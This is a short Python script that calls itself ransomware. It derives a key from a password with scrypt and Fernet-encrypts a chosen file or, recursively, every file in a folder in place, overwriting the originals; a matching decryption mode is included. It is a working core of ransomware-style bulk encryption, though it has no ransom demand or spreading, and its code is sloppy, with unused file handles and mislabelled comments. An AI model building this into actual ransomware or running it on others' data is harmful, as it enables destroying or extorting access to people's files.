#!/bin/python3


# Instructions
'''
1. Make a salt for hashing passwords
2. Use that salt and prompted password to make a key of it for decryption
3. Encode the derived key with urlsafe_b64encode
4. Use that key in Fernet To encode/decode files
5. Define 2 Functions for encrypting single files and folders / Same 2 for decryption
'''


import random, cryptography,pathlib, os, secrets, base64, getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


def generate_salt():
	"""Generate the salt used for key derivation, `size` is the length of the salt to generate"""
	return secrets.token_bytes()
	
def derive_key(password,salt):
	# Makes a key by password and salt used for furthe control of the programme
	kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
	return kdf.derive(password.encode())

def generate_key(password,load_existing_salt=False, save_salt=True):
	if load_existing_salt:
		with open('salt.salt','rb') as salt_file:
			salt = salt_file.read()
	elif save_salt:
		salt = generate_salt()
		with open('salt.salt','wb') as salt_file:
			salt_file.write(salt)
	key = derive_key(password,salt)
	return base64.urlsafe_b64encode(key)
	
def encrypt(filename,key):
	fer = Fernet(key)
	
	with open(filename,'rb') as file:
		data = file.read()
	encrypted_data = fer.encrypt(data)
	with open(filename,'wb') as file:
		file.write(encrypted_data)

def decrypt(filename, key):
	"""Given a filename (str) and key (bytes), it decrypts the file and write
	it"""
	fer = Fernet(key)
	with open(filename, "rb") as file:
		# read the encrypted data
		encrypted_data = file.read()
	# decrypt data
	try:
		decrypted_data = fer.decrypt(encrypted_data)
	except cryptography.fernet.InvalidToken:
		print("[!] Invalid token, most likely the password is incorrect")
		return
	# write the original file
	with open(filename, "wb") as file:
		file.write(decrypted_data)
def encrypt_folder(folder_name,key):
	for child in pathlib.Path(folder_name).glob('*'):
		if child.is_file():
			print(f"[*] Encrypting {child}")
			encrypt(child, key)
		elif child.is_dir():
			encrypt_folder(child, key)
def decrypt_folder(foldername, key):
	# if it's a folder, decrypt the entire folder
	for child in pathlib.Path(foldername).glob("*"):
		if child.is_file():
			print(f"[*] Decrypting {child}")
			decrypt(child, key)
		elif child.is_dir():
			decrypt_folder(child, key)

		
if __name__ == "__main__":
	print('Welcome To Ransomeware!')
	choice = input('1 for Encryption\n2 for Decryption\n>')
	if choice == '1':
		password = input('Enter Your Password : ')
		file = input('Path : ')
		key = generate_key(password)
		if os.path.isfile(file):
			# if it is a file, encrypt it
			encrypt(file, key)
		elif os.path.isdir(file):
			encrypt_folder(file,key)
	elif choice == '2':
		password = input('Enter Your Password : ')
		file = input('Filename : ')
		if os.path.isfile(file):
			with open('salt.salt','rb') as salt_file:
				# if it is a file, encrypt it
				key=generate_key(password,load_existing_salt=True)
				decrypt(file, key=key)
		elif os.path.isdir(file):
			with open('salt.salt','rb') as salt_file:
				# if it is a file, encrypt it
				key=generate_key(password,load_existing_salt=True)
				decrypt_folder(file, key=key)
	else:
		print('Invalid Choice!')
	
	
